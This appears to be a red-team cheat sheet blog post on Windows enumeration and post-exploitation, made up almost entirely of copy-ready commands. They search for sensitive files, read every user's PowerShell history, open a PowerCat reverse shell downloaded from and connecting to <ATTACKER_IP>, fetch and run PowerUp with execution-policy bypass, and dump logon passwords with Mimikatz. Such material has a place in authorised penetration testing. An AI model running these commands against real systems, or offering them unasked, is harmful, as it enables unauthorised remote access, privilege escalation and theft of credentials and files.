---
title: Windows Enumeration for Red Team
author: "novran"
date: 2024-11-27 00:00:00 +0700
categories: [Windows Pentest]
tags: [Windows Pentest]
mermaid: true
---

## Find Juicy Files

```powershell
# Unfiltered
Get-ChildItem -Path . -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }

# Filterer Extension
Get-ChildItem -Path . -Include *.txt -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }

# Filterer Multiple Extensions
Get-ChildItem -Path . -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.ini,*.yaml,*.yml,*.xml,*.sql -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }
```

## Reverse Shell

### Invoke-Expression with PowerCat

Download [Powercat v2.0](https://github.com/rexpository/powercat-v2.0).

```
# PowerShell
IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/powercat.ps1');powerrcatt -c <ATTACKER_IP> -p 5555 -e cmd

# CMD
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/powercat.ps1');powerrcatt -c <ATTACKER_IP> -p 5555 -e cmd"
```

## PowerShell History

```powershell
Get-History
(Get-PSReadlineOption).HistorySavePath
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Enumerate All Users via Administrator
```powershell
Get-WmiObject Win32_UserProfile | Where-Object { -not $_.Special -and $_.LocalPath } | ForEach-Object { $file = Join-Path -Path $_.LocalPath -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; if (Test-Path $file) { "`n=== History for user: $($_.LocalPath) ===`n"; Get-Content $file } }
```

Script Block Logging.
```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Id -eq 4104 } | Format-List -Property * | Out-File "scriptblocklogs.txt"
```

## Privilege Escalation (Auto)

Download [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).

```
powershell -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1'); Invoke-AllChecks"
```

## Credential Dump

Download [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases/latest).

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
```
